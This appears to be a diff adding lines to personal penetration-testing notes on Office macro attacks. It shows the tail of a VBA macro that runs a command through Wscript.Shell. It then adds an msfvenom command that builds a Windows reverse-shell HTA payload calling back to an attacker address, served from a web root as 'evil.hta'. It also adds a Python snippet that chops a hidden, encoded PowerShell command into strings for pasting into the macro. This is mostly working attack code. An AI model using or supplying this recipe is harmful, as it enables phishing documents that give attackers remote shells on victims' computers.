@@ -56,3 +56,14 @@ Sub MyMacro()
 
     CreateObject("Wscript.Shell").Run Str
 End Sub
+
+#Creating HTA payload with msfvenom
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
+
+#Python script to split Base64 encoded string
+str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
+
+n = 50
+
+for i in range(0, len(str), n):
+	print "Str = Str + " + '"' + str[i:i+n] + '"'
